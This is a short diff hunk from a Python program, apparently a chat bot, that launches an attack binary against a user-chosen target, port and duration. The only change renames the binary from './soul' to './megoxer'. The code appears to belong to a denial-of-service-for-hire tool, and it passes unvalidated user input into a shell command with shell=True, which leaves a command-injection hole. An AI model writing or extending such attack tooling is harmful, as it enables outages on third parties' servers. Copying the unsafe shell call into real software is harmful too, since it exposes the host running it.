@@ -167,7 +167,7 @@ def process_attack_details(message):
                 last_attack_time[user_id] = datetime.datetime.now()
 
                 # Start the attack process
-                subprocess.Popen(f"./soul {target} {port} {duration} 900", shell=True)
+                subprocess.Popen(f"./megoxer {target} {port} {duration} 900", shell=True)
 
                 # Notify the user when the attack is complete
                 threading.Thread(target=notify_attack_finished, args=(message, duration)).start()
